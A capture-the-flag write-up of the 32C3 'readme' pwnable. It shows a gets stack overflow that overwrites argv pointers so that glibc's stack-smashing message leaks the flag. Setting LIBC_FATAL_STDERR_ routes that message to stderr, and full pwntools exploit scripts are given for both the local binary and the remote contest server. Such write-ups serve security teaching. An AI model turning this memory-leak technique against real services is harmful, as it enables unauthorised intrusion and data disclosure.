This is a write-up of the readme challenge from the 32c3 CTF


## The Challenge

This was a pwnable binary with with the flag baked into it, which you could see if you ran:
{% highlight bash %}
$ strings readme.bin  | grep 32C3
32C3_TheServerHasTheFlagHere...
{% endhighlight %}

The flag is located at `0x600d20` in the `.data` section.

The challenge was very simple, it was a service witch `gets` your name onto the stack,
and then it asks you to over write the flag at `0x600d20`


## The Solution


First of all the flag is mapped into memory twice, because of how elf works it is also located in read-only memory at `0x400d20` but only the flag in the `.data` section gets overwritten.

So locally we could get it printed simply by smashing our stack all the way upto `argv`,
and then let `_stack_chk_fail` print it for us.

{% highlight python %}
from pwn import *

flag_addr = 0x400d20

r = process("./readme.bin")
r.recvuntil("What's your name? ")
r.sendline(p64(flag_addr)*80)
r.sendline("THIS OVERWRITES THE FLAG")
r.recvuntil("*** stack smashing detected ***: ")
log.info("The flag is: %s" % r.recvuntil(" ").strip())
{% endhighlight %}

which prints when executed:

{% highlight bash %}
$ python doit.py
[+] Starting program './readme.bin': Done
[*] The flag is: 32C3_TheServerHasTheFlagHere...
[*] Program './readme.bin' stopped with exit code -6
{% endhighlight %}

however this does not work remotely, this is becuase `_stack_chk_fail` calls `__fortify_fail` which calls `__lib_message` which does this:

{% highlight c %}
void
__libc_message (int do_abort, const char *fmt, ...)
{
  va_list ap; 
  int fd = -1; 

  va_start (ap, fmt);

  /* Open a descriptor for /dev/tty unless the user explicitly
     requests errors on standard error.  */
  const char *on_2 = __libc_secure_getenv ("LIBC_FATAL_STDERR_");
  if (on_2 == NULL || *on_2 == '\0')
    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);

  if (fd == -1) 
    fd = STDERR_FILENO;

  // then prints stuff and crashes
}
{% endhighlight %}

which means that we only need to set `LIBC_FATAL_STDERR_` and the flag will get printed over `stderr` instead of `/dev/tty`.

So this is the final exploit:
{% highlight python %}
from pwn import *

env_addr = 0x600d20
flag_addr = 0x400d20

r = remote("136.243.194.62", 1024)
r.recvuntil("What's your name? ")
r.sendline(p64(flag_addr)*80 + p64(env_addr)*20)
r.sendline("LIBC_FATAL_STDERR_=1")
r.recvuntil("*** stack smashing detected ***: ")
log.info("The flag is: %s" % r.recvuntil(" ").strip())
{% endhighlight %}

and we then finally have the flag:

{% highlight bash %}
$ python doit.py
[+] Opening connection to 136.243.194.62 on port 1024: Done
[*] The flag is: 32C3_ELF_caN_b3_pre7ty_we!rd...
[*] Closed connection to 136.243.194.62 port 1024
{% endhighlight %}
